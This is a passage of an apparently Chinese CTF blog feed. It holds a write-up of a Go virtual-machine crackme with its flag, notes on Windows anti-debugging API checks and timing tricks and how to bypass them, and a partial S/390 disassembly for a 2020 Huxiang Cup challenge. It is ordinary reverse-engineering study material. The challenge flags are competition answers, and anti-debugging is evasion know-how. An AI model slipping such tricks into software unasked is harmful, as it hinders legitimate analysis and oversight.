class="string">"%c"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;72c149827155b27ad48d6b5f6c99fd54&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第九届全国电信和互联网行业网络安全管理技能竞赛</title>
      <link href="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/"/>
      <url>/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>在最后10分钟拿到这个题的二血，hhh。<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106230503034.png" alt="image-20201106230503034"></p><p>从文件名字及程序中的字符串：<strong>runtime~</strong>可以知道这是一个go语言写的程序，然后使用IDAGolangHelper脚本还原程序的符号表。这下从函数名称可以极大的减少工作量。</p><p>找到main函数，简单分析一下可以知道这是一个虚拟机类型的题目：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106210626460-1604738087809.png" alt="image-20201106210626460"></p><p>提取出opcode表：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/2.png" alt="image-20201106210922720"></p><p>知道了操作码的功能，从7的数据个数可以知道我们要输入的字符长度是24，<strong>5 ~</strong>其实就是一个取下个数据值。然后对于code = 4,，1*1的操作虽然值没改变但其实在改变取数据index。而对于操作码5 1 4算是多余的类似花指令吧。如果对这个十分熟悉之后可以直接根据opcode和密文逆向flag的，但我还是调试单步调试来做的：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/3.png" alt="image-20201106212942973"></p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/4.png" alt="image-20201106212508124"></p><p>整理了前面几个字符的笔记：后面还有对数据乘法加法的操作，直接调试着走就是。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[<span class="number">0</span>],input[<span class="number">1</span>] = -input[<span class="number">1</span>], input[<span class="number">2</span>] = -input[<span class="number">2</span>], input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>],</span><br><span class="line">f,l,a,g,&#123;I</span><br><span class="line">从开始的几个字符操作调试得出结果flag&#123;,又从input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>] == E1CA5h, 算出input[<span class="number">5</span>] = <span class="string">'I'</span></span><br></pre></td></tr></table></figure><p>这里有一个小技巧：调试时每次输入一个递增的数据，这样还在调试的dump窗口看我们的数据有没有变化。</p><p>最后调试完一遍得到flag：<strong>flag{I_am_the_last_one}</strong></p><p>赛后我也直接根据操作码走了一遍程序的流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">5</span>, <span class="number">1635</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2222</span>, <span class="number">8</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment">//7:input, 2:-, 3:+, 4:*</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反调试记录</title>
      <link href="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>遇到的反调试就记录一下，有些具体内部原理的话有时间再来补。（感觉多半不会坚持记录下去，hhh<a id="more"></a></p><h3 id="NtQueryInformationProcess函数"><a href="#NtQueryInformationProcess函数" class="headerlink" title="NtQueryInformationProcess函数"></a>NtQueryInformationProcess函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *NtQueryInformationProcessPtr)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       HANDLE processHandle,<span class="comment">//进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PROCESSINFOCLASS processInformationClass,<span class="comment">//信息类型</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PVOID processInformation,<span class="comment">//缓冲区，函数返回值存入的地址空间。</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       ULONG processInformationLength,<span class="comment">//缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PULONG returnLength)</span></span>;</span><br><span class="line"><span class="comment">//当第二个参数为7时可以用来查看进程的调试端口。当进程被调试时返回-1，否则返回其它值。</span></span><br></pre></td></tr></table></figure><p>另外由于这是一个未公开的API，所以我们需要使用LoadLibrary和GetProceAddress的方法获取调用地址。这里贴上遇到的程序中使用这个函数来检测调试的实例：</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105170711386.png" alt="image-20201105170711386"></p><p>所以执行完这个函数，可以根据dword_404468的值判断进程是否处于调试。</p><h3 id="NtSetInformationThread函数"><a href="#NtSetInformationThread函数" class="headerlink" title="NtSetInformationThread函数"></a>NtSetInformationThread函数</h3><p>与上面一个函数类似的用法，也需要使用LoadLibrary和GetProceAddress的方法获取调用地址。</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105171431630.png" alt="image-20201105171431630"></p><p>调用这个函数时，如果在第二个参数里指定0x11这个值（意思是ThreadHideFromDebugger），等于告诉操作系统，将所有附加的调试器统统取消掉，即退出调试状态。</p><h3 id="IsProcessorFeaturePresent函数"><a href="#IsProcessorFeaturePresent函数" class="headerlink" title="IsProcessorFeaturePresent函数"></a>IsProcessorFeaturePresent函数</h3><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105172140986.png" alt="image-20201105172140986"></p><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>CheckRemoteDebuggerPresent实际上调用了ntdll里面的ZwQueryInformationProcess来检测，和上面记录的第一个函数一样，其第二个参数是7，被定义为ProcessDebugPort。</p><p>它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    BOOL ret;  </span><br><span class="line">    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">    <span class="keyword">return</span> ret;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果有调试器存在则ret的值为非0</span></span><br></pre></td></tr></table></figure><h3 id="时钟检测（rdtsc）"><a href="#时钟检测（rdtsc）" class="headerlink" title="时钟检测（rdtsc）"></a>时钟检测（rdtsc）</h3><p>这个反调试主要就是检查2个指令执行之间相差的时间，如果我们调试单步执行的时间肯定是大于正常时间的。</p><p>对抗这种反调试，可以打patch，也可以把断点下在它后面，具体还是情况而定。</p><p>一个实例，通过在它后面下断对抗。</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201213172904993.png" alt="image-20201213172904993"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020湖湘杯</title>
      <link href="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
      <url>/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>总的来说这次的re都还好。<a id="more"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h3><p>一个不太常见架构<strong>S/390</strong>的程序，ida后发现不能反汇编，报错。。</p><p>然后在linux下使用qemu来模拟了程序的运行，确定关键字符串：<strong>Please input your string:</strong></p><p>在所给的hex.txt搜索该字符串定位关键字符串的地址，再到dis.txt文件中搜索该地址定位到关键汇编指令地址处。</p><p>接着使用qemu在gdb一个端口进行下断调试验证一下：</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/image-20201102131400699.png" alt></p><p>剩下就是查看文档<a href="http://www.tachyonsoft.com/inst390m.htm" target="_blank" rel="noopener">z Architecture汇编手册</a>来手撸汇编代码。最后整理关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1000910</span>:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)  <span class="comment">//第一个关键函数</span></span><br><span class="line"><span class="number">1000916</span>:e3 f0 ff <span class="number">50</span> ff <span class="number">71</span> lay%r15,<span class="number">-176</span>(%r15)  <span class="comment">//lea</span></span><br><span class="line"><span class="number">100091</span>c:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000920</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)    <span class="comment">//r2 = r11+160  input</span></span><br><span class="line"><span class="number">1000926</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">04</span> lg%r2,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100092</span>c:c0 e5 ff ff ff <span class="number">02</span> brasl%r14,<span class="number">0x1000730</span></span><br><span class="line"><span class="number">1000932</span>:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2 <span class="comment">//mov</span></span><br><span class="line"><span class="number">1000936</span>:a7 <span class="number">1f</span> <span class="number">00</span> <span class="number">20</span>       cghi%r1,<span class="number">32</span>   <span class="comment">//cmp len(input), 32</span></span><br><span class="line"><span class="number">100093</span>a:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">06</span>       je<span class="number">0x1000946</span></span><br><span class="line"><span class="number">100093</span>e:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">1000942</span>:a7 f4 <span class="number">00</span> <span class="number">56</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">1000946</span>:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">100094</span>c:a7 f4 <span class="number">00</span> <span class="number">49</span>       j<span class="number">0x10009de</span></span><br><span class="line"><span class="number">1000950</span>:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000956</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100095</span>c:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000960</span>:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000964</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2f</span> clfi%r1,<span class="number">47</span></span><br><span class="line"><span class="number">100096</span>a:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x100098c</span></span><br><span class="line"><span class="number">100096</span>e:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000974</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100097</span>a:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100097</span>e:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000982</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">39</span> clfi%r1,<span class="number">57</span></span><br><span class="line"><span class="number">1000988</span>:a7 c4 <span class="number">00</span> <span class="number">24</span>       jle<span class="number">0x10009d0</span></span><br><span class="line"><span class="number">100098</span>c:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000992</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">1000998</span>:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100099</span>c:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009</span>a0:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">60</span> clfi%r1,<span class="number">96</span></span><br><span class="line"><span class="number">10009</span>a6:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x10009c8</span></span><br><span class="line"><span class="number">10009</span>aa:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>0:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>6:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">10009b</span>a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009b</span>e:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">66</span> clfi%r1,<span class="number">102</span></span><br><span class="line"><span class="number">10009</span>c4:a7 c4 <span class="number">00</span> <span class="number">09</span>       jle<span class="number">0x10009d6</span></span><br><span class="line"><span class="number">10009</span>c8:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">10009</span>cc:a7 f4 <span class="number">00</span> <span class="number">11</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">10009</span>d0:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d2:a7 f4 <span class="number">00</span> <span class="number">03</span>       j<span class="number">0x10009d8</span></span><br><span class="line"><span class="number">10009</span>d6:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d8:eb <span class="number">01</span> b0 ac <span class="number">00</span> <span class="number">6</span>a asi<span class="number">172</span>(%r11),<span 